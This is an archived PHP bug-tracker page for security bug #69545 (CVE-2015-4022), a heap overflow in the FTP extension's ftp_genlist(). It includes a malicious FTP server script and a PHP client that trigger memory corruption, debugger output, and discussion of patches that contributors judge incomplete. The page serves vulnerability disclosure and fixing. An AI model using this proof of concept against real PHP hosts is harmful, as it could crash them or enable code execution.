@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='FTP related Bug #69545 - RDF' href='rss/bug.php?id=69545'>
+        <link rel='alternate' type='application/rss+xml' title='FTP related Bug #69545 - RSS 2.0' href='rss/bug.php?id=69545&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #69545 :: Integer overflow in ftp_genlist() resulting in heap overflow</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=69545">Sec Bug</a>&nbsp;#69545</th>
+            <td id="summary" colspan="5">Integer overflow in ftp_genlist() resulting in heap overflow</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2015-04-28 23:55 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2015-05-19 05:33 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>maxgeorgspelsberg &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=laruence">laruence</a> (<a href="https://people.php.net/laruence">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=FTP+related">FTP related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.6.8</td>
+            <th class="details">OS:</th>
+            <td></td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4022" target="_blank">2015-4022</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=69545&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=69545&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=69545&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1430265305">&nbsp;</a><strong>[2015-04-28 23:55 UTC] maxgeorgspelsberg &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+The ftp_genlist() function of the ftp extension is prone to an integer overflow, which may result in remote code execution.
+
+ext/ftp/ftp.c:ftp_genlist(...)
+1826         size = 0;
+1827         lines = 0;
+1828         lastch = 0;
+1829         while ((rcvd = my_recv(ftp, data-&gt;fd, data-&gt;buf, FTP_BUFSIZE))) {
+1830                 if (rcvd == -1) {
+1831                         goto bail;
+1832                 }
+1833
+1834                 php_stream_write(tmpstream, data-&gt;buf, rcvd);
+1835
+1836                 size += rcvd;
+1837                 for (ptr = data-&gt;buf; rcvd; rcvd--, ptr++) {
+1838                         if (*ptr == '\n' &amp;&amp; lastch == '\r') {
+1839                                 lines++; // [0]
+1840                         } else {
+1841                                 size++; // [1]
+1842                         }
+1843                         lastch = *ptr;
+1844                 }
+1845         }
+
+In the above loop `size' or `lines' may overflow (at [0] respectively [1]).
+This requires sending more than 2^32 bytes, which will be stored in a tempfile.
+
+1851         ret = safe_emalloc((lines + 1), sizeof(char*), size); // [2]
+1852
+1853         entry = ret;
+1854         text = (char*) (ret + lines + 1);
+1855         *entry = text;
+1856         lastch = 0;
+1857         while ((ch = php_stream_getc(tmpstream)) != EOF) {
+1858                 if (ch == '\n' &amp;&amp; lastch == '\r') {
+1859                         *(text - 1) = 0;
+1860                         *++entry = text;
+1861                 } else {
+1862                         *text++ = ch; // [3]
+1863                 }
+1864                 lastch = ch;
+1865         }
+1866         *entry = NULL;
+
+This results in the allocated buffer at [2] being to small to hold the data written to
+the tempfile, which results in a heap overflow at [3] when loading the contents of the
+tempfile back into memory.
+
+These kind of bugs are well-known to be exploitable and since php_stream_getc uses structs
+located on the heap, which may be overwritten, I think that this bug can be leveraged to attain
+remote code execution.
+
+Regards,
+Max Spelsberg
+
+
+malicious_server.py
+===================
+#!/usr/bin/env python2
+# coding: utf-8
+
+# based on <a href="https://gist.github.com/scturtle/1035886" rel="nofollow">https://gist.github.com/scturtle/1035886</a>
+
+import os,socket,threading,time
+
+allow_delete = False
+local_ip = &quot;localhost&quot;
+local_port = 8887
+currdir=os.path.abspath('.')
+
+class FTPserverThread(threading.Thread):
+    def __init__(self,(conn,addr)):
+        self.conn=conn
+        self.addr=addr
+        self.basewd=currdir
+        self.cwd=self.basewd
+        self.rest=False
+        self.pasv_mode=False
+        threading.Thread.__init__(self)
+
+    def run(self):
+        self.conn.send('220 Welcome!\r\n')
+        while True:
+            cmd=self.conn.recv(256)
+            if not cmd: break
+            else:
+                print 'Recieved:',cmd
+                try:
+                    func=getattr(self,cmd[:4].strip().upper())
+                    func(cmd)
+                except Exception,e:
+                    print 'ERROR:',e
+                    #traceback.print_exc()
+                    self.conn.send('500 Sorry.\r\n')
+            self.conn.close()
+
+    def TYPE(self,cmd):
+        self.mode=cmd[5]
+        self.conn.send('200 Binary mode.\r\n')
+
+    def PASV(self,cmd): # from <a href="http://goo.gl/3if2U" rel="nofollow">http://goo.gl/3if2U</a>
+        self.pasv_mode = True
+        self.servsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.servsock.bind((local_ip,0))
+        self.servsock.listen(1)
+        ip, port = self.servsock.getsockname()
+        print 'open', ip, port
+        self.conn.send('227 Entering Passive Mode (%s,%u,%u).\r\n' %
+                (','.join(ip.split('.')), port&gt;&gt;8&amp;0xFF, port&amp;0xFF))
+
+    def start_datasock(self):
+        if self.pasv_mode:
+            self.datasock, addr = self.servsock.accept()
+            print 'connect:', addr
+        else:
+            self.datasock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            self.datasock.connect((self.dataAddr,self.dataPort))
+
+    def stop_datasock(self):
+        self.datasock.close()
+        if self.pasv_mode:
+            self.servsock.close()
+
+    # THIS is the interesting part    
+    def LIST(self,cmd):
+        self.conn.send('150 Here comes the directory listing.\r\n')
+        print 'list:', self.cwd
+        self.start_datasock()
+
+        # send 2^32 + 1 bytes of data
+        for i in xrange(262144):
+            if i % 10000 == 0:
+                print &quot;%d&quot; % i
+            self.datasock.send(&quot;B&quot;*16384)
+        self.datasock.send(&quot;A\r\n&quot;)
+
+        self.stop_datasock()
+        self.conn.send('226 Directory send OK.\r\n')
+
+
+class FTPserver(threading.Thread):
+    def __init__(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.bind((local_ip,local_port))
+        threading.Thread.__init__(self)
+
+    def run(self):
+        self.sock.listen(5)
+        while True:
+            th=FTPserverThread(self.sock.accept())
+            th.daemon=True
+            th.start()
+
+    def stop(self):
+        self.sock.close()
+
+if __name__=='__main__':
+    ftp=FTPserver()
+    ftp.daemon=True
+    ftp.start()
+    print 'On', local_ip, ':', local_port
+    raw_input('Enter to end...\n')
+    ftp.stop()
+
+buggy.php
+=========
+&lt;?php
+    $id = ftp_connect(&quot;localhost&quot;, 8887);
+    ftp_pasv($id, TRUE);
+    var_dump(ftp_rawlist($id, &quot;/&quot;));
+?&gt;
+
+
+Result
+======
+(lldb) r ./buggy.php
+Process 54712 launched: '/usr/bin/php' (x86_64)
+Process 54712 stopped
+* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)
+    frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182
+libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown:
+-&gt;  0x7fff86503056 &lt;+182&gt;: movb   (%rsi,%r8), %cl
+    0x7fff8650305a &lt;+186&gt;: movb   %cl, (%rdi,%r8)
+    0x7fff8650305e &lt;+190&gt;: subq   $0x1, %rdx
+    0x7fff86503062 &lt;+194&gt;: je     0x7fff86503078            ; &lt;+216&gt;
+(lldb) register read rsi
+     rsi = 0x00000001024243de
+(lldb) bt
+* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)
+  * frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182
+    frame #1: 0x000000010031b2c7 php`_php_stream_read + 81
+    frame #2: 0x000000010031b8a1 php`_php_stream_getc + 22
+    frame #3: 0x000000010010ec3a php`___lldb_unnamed_function2574$$php + 614
+    frame #4: 0x000000010010c21c php`___lldb_unnamed_function2530$$php + 118
+    frame #5: 0x00000001003cb2af php`___lldb_unnamed_function9391$$php + 1752
+    frame #6: 0x00000001003813b0 php`execute_ex + 79
+    frame #7: 0x000000010035d592 php`zend_execute_scripts + 482
+    frame #8: 0x0000000100308897 php`php_execute_script + 684
+    frame #9: 0x00000001003edce0 php`___lldb_unnamed_function9505$$php + 4653
+    frame #10: 0x00000001003ec93c php`___lldb_unnamed_function9503$$php + 1408
+    frame #11: 0x00007fff8cb8d5c9 libdyld.dylib`start + 1
+(lldb)
+[Note that the first three bytes (42, 43, de) of rsi have been overwritten!]
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=69545'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=69545'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1430321828">&nbsp;</a><strong>[2015-04-29 15:37 UTC] maxgeorgspelsberg &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>This should fix the bug (As the bug is marked private, I unfortunately can't add a patch, so I have to resort to adding a new comment):
+
+diff --git a/ext/ftp/ftp.c b/ext/ftp/ftp.c
+index a6e0dfd..b805abe 100644
+--- a/ext/ftp/ftp.c
++++ b/ext/ftp/ftp.c
+@@ -1653,7 +1653,7 @@ ftp_genlist(ftpbuf_t *ftp, const char *cmd, const char *path TSRMLS_DC)
+        lines = 0;
+        lastch = 0;
+        while ((rcvd = my_recv(ftp, data-&gt;fd, data-&gt;buf, FTP_BUFSIZE))) {
+-               if (rcvd == -1) {
++               if (rcvd == -1 || size &gt; INT_MAX - (rcvd * 2)) {
+                        goto bail;
+                }
+
+After investigating a little bit further I noticed, that the provided test script(s) overwrite a part of the php_stream struct with user controlled data:
+
+(lldb) frame variable *stream
+(php_stream) *stream = {
+  ops = 0x4242424242424242
+  abstract = 0x4242424242424242
+  readfilters = {
+    head = 0x4242424242424242
+    tail = 0x4242424242424242
+    stream = 0x4242424242424242
+  }
+[...]
+
+`ops' points to a bunch of function pointers, so arbitrary code execution
+is much easier to achieve, than I previously thought.
+</pre>
+</div><div class='comment type_svn' ><a name="1431459624">&nbsp;</a><strong>[2015-05-12 19:40 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=ac2832935435556dc593784cd0087b5e576bbe4d" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=ac2832935435556dc593784cd0087b5e576bbe4d</a>
+Log: Fix <a href='bug.php?id=69545'>bug #69545</a> - avoid overflow when reading list
+</pre>
+</div><div class='comment type_log' ><a name="1431459624">&nbsp;</a><strong>[2015-05-12 19:40 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Open</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1431471531">&nbsp;</a><strong>[2015-05-12 22:58 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=ac2832935435556dc593784cd0087b5e576bbe4d" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=ac2832935435556dc593784cd0087b5e576bbe4d</a>
+Log: Fix <a href='bug.php?id=69545'>bug #69545</a> - avoid overflow when reading list
+</pre>
+</div><div class='comment type_svn' ><a name="1431514405">&nbsp;</a><strong>[2015-05-13 10:53 UTC] <a href="//people.php.net/jpauli">jpauli@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=739adee1912176aacf351edc5751a02ded6ef1ec" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=739adee1912176aacf351edc5751a02ded6ef1ec</a>
+Log: Fix <a href='bug.php?id=69545'>bug #69545</a> - avoid overflow when reading list
+</pre>
+</div><div class='comment type_comment' ><a name="1431550655">&nbsp;</a><strong>[2015-05-13 20:57 UTC] maxgeorgspelsberg &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>It's great to see this bug being fixed. Unfortunately the patch is flawed.
+
+In the recv loop (line 1829-1845 in my bug report) `size' can be incremented at two places. Once at `size += rcvd' and also at `size++'. This means that `size' can be incremented by more than `rcvd' per iteration, which results in the added overflow check being bypassable.
+
+`size' can be incremented by at most `rcvd * 2' per iteration, which is the reason my previously suggested fix uses `rcvd * 2' and not only `rcvd'.
+
+To properly fix the bug I suggest - in addition to the overflow check already in existence - removing the else branch, that increments `size' by one, resulting in `size' only being increased by `rcvd' or less per iteration and thus ensuring the overflow check can't be bypassed.
+
+It's also worth noting that said branch isn't necessary for the workings of the function and just needlessly complicates it.
+
+Regards,
+Max Spelsberg
+
+==
+@@ -1663,8 +1663,6 @@ ftp_genlist(ftpbuf_t *ftp, const char *cmd, const char *path TSRMLS_DC)
+                for (ptr = data-&gt;buf; rcvd; rcvd--, ptr++) {
+                        if (*ptr == '\n' &amp;&amp; lastch == '\r') {
+                                lines++;
+-                       } else {
+-                               size++;
+                        }
+                        lastch = *ptr;
+                }
+</pre>
+</div><div class='comment type_log' ><a name="1432013636">&nbsp;</a><strong>[2015-05-19 05:33 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: laruence</span>
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID:      2015-4022</span>
+</div></div></div><div class='comment type_comment' ><a name="1432802940">&nbsp;</a><strong>[2015-05-28 08:49 UTC] thoger &#x61;&#116; redhat &#x64;&#111;&#x74; com</strong>
+<pre class='note'>I concur with the comment above - the fix seems incorrect / incomplete, because input characters are counted twice.  That also reduces amount of data malicious FTP server needs to send to trigger this bug in unpatched PHP versions.  Malicious sever in the report sends 4G of data, but half of that is sufficient.
+
+As the applied patch changed types from int to size_t, so the incomplete fix problem is only relevant on 32bit platforms.
+
+Alternative to dropping else branch is to drop size += rcvd; as that counts \n following \r, which do not need to be counted.
+
+Anyone backporting fix to older PHP versions should ensure 8f4a6d6 is also backported.
+</pre>
+</div><div class='comment type_comment' ><a name="1434630912">&nbsp;</a><strong>[2015-06-18 12:35 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
+<pre class='note'>The fix by Max (commit 0765623d) got CVE-2015-4643 assigned to it.
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
